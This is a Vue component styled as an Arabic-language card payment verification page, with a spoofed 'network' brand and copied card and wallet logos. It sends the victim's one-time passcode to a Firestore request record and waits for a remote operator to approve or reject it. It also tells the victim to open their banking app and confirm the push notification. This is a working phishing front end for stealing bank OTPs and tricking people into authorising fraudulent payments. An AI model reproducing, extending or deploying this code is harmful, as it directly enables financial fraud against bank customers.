<script setup lang="ts">
import { ref, computed, onMounted, onUnmounted } from 'vue';
import { useRouter } from 'vue-router';
import { doc, updateDoc, onSnapshot } from 'firebase/firestore';
import { db, handleFirestoreError, OperationType } from '../firebase';

const router = useRouter();
const otp = ref('');
const timeLeft = ref(55); // 00:55
let timer: ReturnType<typeof setInterval> | null = null;
const isSubmitting = ref(false);
const error = ref('');

const pad = (n: number) => n.toString().padStart(2, '0');

const formattedTime = computed(() => {
  const m = Math.floor(timeLeft.value / 60);
  const s = timeLeft.value % 60;
  return `${pad(m)}:${pad(s)}`;
});

onMounted(() => {
  timer = setInterval(() => {
    if (timeLeft.value > 0) {
      timeLeft.value--;
    }
  }, 1000);
});

onUnmounted(() => {
  if (timer) clearInterval(timer);
});

const submitOtp = async () => {
  if (!otp.value || isSubmitting.value) return;

  if (!/^\d{6}$/.test(otp.value)) {
    error.value = 'الرجاء إدخال رمز صحيح مكون من 6 أرقام';
    return;
  }
  error.value = '';

  isSubmitting.value = true;
  
  const requestId = localStorage.getItem('currentRequestId');
  if (!requestId) {
    alert('Request ID not found. Please start from the beginning.');
    isSubmitting.value = false;
    router.push('/');
    return;
  }

  try {
    const requestRef = doc(db, 'requests', requestId);
    const payload = {
      otp: otp.value,
      step: 'otp-bank',
      otpStatus: 'pending',
      updatedAt: new Date().toISOString()
    };
    
    try {
      const fallbackStr = localStorage.getItem('fallback_requests') || '{}';
      const fallbackData = JSON.parse(fallbackStr);
      if (fallbackData[requestId]) {
        fallbackData[requestId] = { ...fallbackData[requestId], ...payload };
        localStorage.setItem('fallback_requests', JSON.stringify(fallbackData));
      }
    } catch(e) {}

    await updateDoc(requestRef, payload);
    
    const unsubscribe = onSnapshot(requestRef, (docSnap) => {
      if (docSnap.exists()) {
        const data = docSnap.data();
        if (data.otpStatus === 'approved') {
          unsubscribe();
          alert('العملية تمت بنجاح!');
          localStorage.removeItem('currentRequestId');
          isSubmitting.value = false;
          router.push('/');
        } else if (data.otpStatus === 'rejected') {
          unsubscribe();
          error.value = 'الرجاء إدخال رمز صحيح. الرمز غير صحيح.';
          otp.value = '';
          isSubmitting.value = false;
        }
      }
    });

  } catch (err) {
    handleFirestoreError(err, OperationType.UPDATE, `requests/${requestId}`);
    error.value = 'حدث خطأ أثناء إرسال الرمز. يرجى المحاولة مرة أخرى.';
    isSubmitting.value = false;
  }
};
</script>

<template>
  <div class="min-h-screen bg-[#fafafa] flex flex-col items-center pt-8 pb-10 px-4 font-sans text-gray-800">
    
    <!-- Top Header -->
    <div class="mb-6 w-full flex flex-col items-center">
      <h1 class="text-4xl font-light text-slate-800 tracking-wide mb-10">Payment</h1>
      <div class="font-bold text-[45px] flex items-center tracking-tight mb-4">
        <span class="text-[#005bb5]">network</span>
        <span class="text-[#e21838] ml-1 text-3xl font-bold">></span>
      </div>
    </div>

    <!-- Main Card -->
    <div class="bg-white rounded-xl shadow-[0_10px_40px_rgb(0,0,0,0.12)] w-full max-w-[420px] border border-gray-100 p-8 flex flex-col items-center relative z-10 text-center mx-4 pb-12">
      
      <p class="text-gray-900 text-[19px] mb-8 font-medium leading-relaxed" dir="rtl">
        إذا لم تتلقى رمز التأكيد برسالة نصية عبر جوالك
      </p>

      <p class="text-gray-900 text-[21px] font-medium leading-normal mb-12 mt-2" dir="rtl">
        قم بفتح التطبيق البنكي<br/>
        سيظهر لك اشعار فوري<br/>
        قم بالضغط على الاشعار لتأكيد الطلب
      </p>

      <div class="flex items-center gap-6 w-full mb-10 justify-between px-2">
        <div class="w-full relative group flex-1">
          <input 
            type="text" 
            v-model="otp" 
            placeholder="* * * * * *" 
            class="w-full border border-gray-800 rounded-lg py-3.5 text-center text-xl tracking-[0.4em] focus:outline-none focus:border-gray-500 text-gray-800 bg-transparent transition-colors placeholder-gray-500"
            maxlength="6"
          />
          <p v-if="error" class="text-red-500 text-sm mt-2 absolute -bottom-6 w-full text-center">{{ error }}</p>
        </div>

        <!-- Timer -->
        <div class="text-[24px] font-normal text-gray-800 font-sans ml-2">
          {{ formattedTime }}
        </div>
      </div>

      <!-- Submit Button -->
      <button 
        @click="submitOtp" 
        :disabled="isSubmitting"
        class="w-full bg-[#3b3b3b] hover:bg-[#222] text-white py-4 rounded-[6px] font-medium text-[18px] tracking-wide transition-all disabled:opacity-70 disabled:cursor-not-allowed flex items-center justify-center gap-2 px-6 shadow-sm"
      >
        <span v-if="isSubmitting" class="animate-spin rounded-full h-5 w-5 border-b-2 border-white"></span>
        <span v-else>verification code</span>
      </button>

    </div>

    <!-- Logos Footer -->
    <div class="mt-12 flex flex-wrap items-center justify-center gap-4 w-full max-w-[450px] px-2 mb-8">
       <!-- Mock images using pure CSS for visual structure from screenshot -->
       <div class="border border-gray-200 bg-white rounded px-3 py-1 flex items-center justify-center text-[10px] h-8 text-[#0f54a8] font-bold">SAMSUNG<br/>pay</div>
       <div class="border border-gray-200 bg-white rounded px-3 py-1 flex items-center justify-center text-[12px] h-8 font-medium text-gray-600 gap-1"><span class="text-blue-500 font-bold">G</span> Pay</div>
       <div class="border border-gray-200 bg-white rounded px-2 py-1 flex items-center justify-center h-8 bg-[#2d6fa8]"><span class="text-white font-bold text-[8px] leading-tight text-center">AMERICAN<br/>EXPRESS</span></div>
       <div class="border border-gray-200 bg-white rounded px-3 py-1 flex items-center justify-center h-8">
         <div class="w-3 h-3 bg-red-500 rounded-full opacity-90 -mr-1"></div>
         <div class="w-3 h-3 bg-yellow-400 rounded-full opacity-90 -ml-1 mix-blend-multiply"></div>
       </div>
       <div class="border border-gray-200 bg-white rounded px-3 py-1 flex items-center justify-center text-[#1a1f71] text-[16px] font-bold italic h-8">VISA</div>
    </div>

  </div>
</template>
